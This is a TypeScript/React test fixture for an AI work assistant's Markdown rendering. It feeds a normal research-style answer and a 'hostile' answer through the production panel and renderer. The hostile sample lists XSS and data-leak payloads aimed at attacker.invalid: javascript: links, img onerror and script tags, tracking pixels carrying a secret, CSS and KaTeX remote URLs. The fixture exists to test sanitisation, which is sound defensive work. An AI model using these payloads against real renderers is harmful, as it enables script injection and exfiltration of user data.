import { useState, type ReactElement } from 'react'
import { createRoot } from 'react-dom/client'
import { defaultKunRuntimeSettings } from '../../src/shared/app-settings-kun-defaults'
import type { AppSettingsV1 } from '../../src/shared/app-settings'
import type { CoreTurnItemJson } from '../../src/renderer/src/agent/kun-contract'
import type { ChatBlock } from '../../src/renderer/src/agent/types'
import '../../src/renderer/src/index.css'
import '../../src/renderer/src/styles/base-shell.css'
import '../../src/renderer/src/styles/surfaces-write.css'
import '../../src/renderer/src/styles/markdown-code.css'
import '../../src/renderer/src/styles/write-editor.css'
import '../../src/renderer/src/styles/neutral-polish.css'

// Only host services/data are synthetic. The full assistant panel, timeline,
// stores, item mapper, Markdown renderers, translations and styles are real.
const threadId = 'native-markdown-fixture'
const storageKey = 'kun-native-work-markdown-fixture'
const calls: unknown[] = []
const reads: unknown[] = []
const settings = { agents: { kun: defaultKunRuntimeSettings() } } as AppSettingsV1
const action = (name: string) => (...args: unknown[]) => { calls.push({ name, args }) }
Object.assign(window, {
  __markdownXss: 0,
  kunGui: {
    platform: 'linux',
    getSettings: async () => settings,
    runtimeRequest: async (path: string, method = 'GET', body?: string) => {
      reads.push({ path, method })
      if (method !== 'GET') calls.push({ name: 'runtimeRequest', path, method, body })
      const url = new URL(path, 'http://fixture.invalid')
      const result = url.pathname === '/v1/usage'
        ? { group_by: url.searchParams.get('group_by'), thread_id: threadId, buckets: [] }
        : { threads: [], items: [], agents: [], memories: [], tools: [], skills: [], sessions: [], running: 0 }
      return { ok: true, status: 200, body: JSON.stringify(result) }
    },
    openExternal: action('openExternal'),
    openPath: action('openPath'),
    showItemInFolder: action('showItemInFolder'),
    writeClipboardText: action('writeClipboardText')
  }
})

const [panel, timeline, chat, workspace, harness, mapper, liveProjection, theme, language] = await Promise.all([
  import('../../src/renderer/src/components/write/WriteAssistantPanel'),
  import('../../src/renderer/src/components/chat/LazyMessageTimeline'),
  import('../../src/renderer/src/store/chat-store'),
  import('../../src/renderer/src/write/write-workspace-store'),
  import('../../src/renderer/src/store/harness-store'),
  import('../../src/renderer/src/agent/kun-mapper-events'),
  import('../../src/renderer/src/agent/kun-runtime-thread-live-projection'),
  import('../../src/renderer/src/lib/apply-theme'),
  import('../../src/renderer/src/i18n')
])
const { WriteAssistantPanel } = panel
const { LazyMessageTimeline } = timeline
harness.useHarnessStore.setState({ rowsLoadedAt: Date.now() })
workspace.useWriteWorkspaceStore.setState({ workspaceRoot: '/fixture/workspace', activeFilePath: null, workSurface: 'papers' })
chat.useChatStore.setState({ route: 'write', activeThreadId: threadId, workspaceRoot: '/fixture/workspace',
  runtimeConnection: 'ready', composerHarnessId: 'kun', composerModelCatalogStatus: 'ready' })
await language.default.changeLanguage('en')
theme.applyTheme('light')

const markdown = [
  '# Evidence summary', '',
  'A **strong result**, *careful emphasis* and ~~revised claim~~. Prices remain $5 and $10.', '',
  '## Findings', '',
  '1. Primary observation', '   - Supporting evidence', '     - Nested detail',
  '2. Repeated observation', '',
  '- [x] Reviewed locally', '- [ ] Needs replication', '  - [x] Nested check', '',
  '> A bounded quotation, with no implied wider evidence.', '',
  '### Comparison', '',
  '| Evidence | Population | Method | Confidence | Limitation | Follow-up |',
  '| :--- | ---: | :--- | :--- | :--- | :--- |',
  '| Measured | 128 | Local sample | Moderate | Small cohort | Replicate |',
  '| Repeated | 256 | Independent sample | High | Synthetic fixture | Review |', '',
  '#### Local mathematics', '',
  'Inline $$E=mc^2$$ stays readable.', '',
  '$$', String.raw`\int_0^1 x^2\,dx = \frac{1}{3}`, '$$', '',
  '$$', String.raw`\sum_{i=1}^{n} x_i = a_1 + a_2 + a_3 + a_4 + a_5 + a_6 + a_7 + a_8 + a_9 + a_{10} + a_{11} + a_{12}`, '$$', '',
  '##### Source code', '',
  '```typescript', 'const result = { evidence: "<!-- preserved -->", confidence: 0.95 };',
  'console.log("This deliberately long line stays available by horizontal scrolling", result);', '```', '',
  'Inline `<!-- literal -->` remains source text.', '',
  '###### Reading notes', '',
  '\u8bba\u6587\u52a9\u624b\uff1a\u8bc1\u636e\u3001\u8868\u683c\u4e0e\u6570\u5b66\u516c\u5f0f\u3002', '',
  '[Ordinary reference](https://example.invalid/reference)', '',
  'End of fixture answer.'
].join('\n')
const hostile = [
  '<think>## Untrusted reasoning\n\n![Reasoning image label](https://attacker.invalid/thought-pixel) [Reasoning link label](https://attacker.invalid/thought-link)</think>', '',
  '# Hostile source remains readable', '',
  '![Remote image label](https://attacker.invalid/pixel?secret=paper)',
  '![Local image label](file:///private/source) ![Data image label](data:image/svg+xml,attack)',
  '[Remote link label](https://attacker.invalid/link) [File link label](deepseek-file:///private/source)',
  '[JavaScript link](javascript:window.__markdownXss=1) <https://attacker.invalid/autolink>', '',
  '<img src="https://attacker.invalid/raw" onerror="window.__markdownXss=1">',
  '<iframe src="https://attacker.invalid/frame"></iframe><script>window.__markdownXss=1</script>',
  '<style>body{background:url(https://attacker.invalid/css)}</style>',
  '<svg><foreignObject><img src="https://attacker.invalid/svg"></foreignObject></svg>', '',
  String.raw`$$\includegraphics{https://attacker.invalid/math-image}$$`,
  String.raw`$$\href{https://attacker.invalid/math-link}{remote}$$`,
  String.raw`$$\href{javascript:window.__markdownXss=1}{unsafe}$$`,
  String.raw`$$\htmlStyle{background:url(https://attacker.invalid/math-css)}{unsafe}$$`,
  String.raw`$$\htmlClass{math-injected}{unsafe}$$`, '',
  '```mermaid', 'graph LR; secret --> remote', '```', '',
  '```chart', '{"url":"https://attacker.invalid/chart"}', '```', '',
  '```html', '<img src="https://attacker.invalid/code">', '```', '',
  'Hostile fixture complete.'
].join('\n')

type Scenario = 'before' | 'paper' | 'ordinary-work' | 'ordinary-code' | 'hostile'
type State = { scenario: Scenario; item: CoreTurnItemJson; streaming: boolean }
function item(text: string, scenario: Scenario, streaming = false): CoreTurnItemJson {
  return { id: 'fixture-answer', kind: 'assistant_text', role: 'assistant',
    threadId, turnId: 'fixture-turn', createdAt: '2026-01-01T12:00:00Z',
    status: streaming ? 'running' : 'completed', text,
    ...(scenario === 'before' ? { renderMode: 'plain-text' as const }
      : scenario === 'paper' || scenario === 'hostile' ? { renderMode: 'safe-markdown' as const } : {}) }
}
function initialState(): State {
  const saved = localStorage.getItem(storageKey)
  return saved ? JSON.parse(saved) as State : { scenario: 'paper', item: item(markdown, 'paper'), streaming: false }
}
let current = initialState()
let update: (state: State) => void = () => undefined
function present(state: State): void {
  current = state
  // Use the same item mapper and constrained live-reopen projection as the app.
  const projected = liveProjection.restoredThreadLiveProjection([state.item], 'fixture-turn', state.item.status)
  if (state.item.renderMode && projected.liveItemIds.size !== 0) throw new Error('Constrained item lost its policy on reopen')
  const block = mapper.chatBlockFromItem(state.item)
  if (!block) throw new Error('Fixture item did not map to a ChatBlock')
  chat.useChatStore.setState({ route: state.scenario === 'ordinary-code' ? 'chat' : 'write',
    busy: state.streaming, busyUnconfirmed: false, currentTurnId: state.streaming ? 'fixture-turn' : null,
    threadLoadingId: null, blocks: [block], liveAssistant: '', liveReasoning: '' })
  update(state)
}
const fixture = {
  calls, reads, markdown, hostile,
  setTheme: theme.applyTheme,
  scenario: (scenario: Scenario) => present({ scenario, item: item(scenario === 'hostile' ? hostile : markdown, scenario), streaming: false }),
  stream: (text: string) => present({ scenario: 'paper', item: item(text, 'paper', true), streaming: true }),
  finish: () => present({ scenario: 'paper', item: item(markdown, 'paper'), streaming: false }),
  save: () => { localStorage.setItem(storageKey, JSON.stringify(current)); return current },
  snapshot: () => ({ ...current, block: mapper.chatBlockFromItem(current.item) }),
  ready: false
}
Object.assign(window, { workMarkdownFixture: fixture })

function Fixture(): ReactElement {
  const [state, setState] = useState(current)
  const [input, setInput] = useState('')
  update = setState
  const block = mapper.chatBlockFromItem(state.item) as ChatBlock
  const common = { blocks: [block], liveReasoning: '', activeThreadId: threadId,
    runtimeConnection: 'ready' as const, onRetryConnection: action('retry'), onOpenSettings: action('settings') }
  return <main className="markdown-fixture-shell">
    <header className="markdown-fixture-label">
      <strong>Work assistant Markdown | {state.scenario}</strong>
      <span>Production panel + timeline + renderer. Isolated fixture host and synthetic item data.</span>
    </header>
    {state.scenario === 'ordinary-code' ? <section className="markdown-fixture-code ds-chat-stage">
      <LazyMessageTimeline {...common} live="" />
    </section> : <WriteAssistantPanel {...common} input={input} setInput={setInput}
      mode="agent" setMode={action('mode')} busy={state.streaming} liveAssistant=""
      composerModel="fixture-model" composerPickList={['fixture-model']}
      composerReasoningEffort="medium" composerFastMode={false}
      setComposerModel={action('model')} setComposerReasoningEffort={action('reasoning')}
      setComposerFastMode={action('fast')} queuedMessages={[]}
      removeQueuedMessage={action('remove-queued')} guideQueuedMessage={action('guide-queued')}
      onSend={action('send')} onInterrupt={action('interrupt')}
      onNewConversation={action('new')} onPickWorkspace={action('workspace')} onCollapse={action('collapse')} />}
  </main>
}
present(current)
createRoot(document.getElementById('root')!).render(<Fixture />)
fixture.ready = true
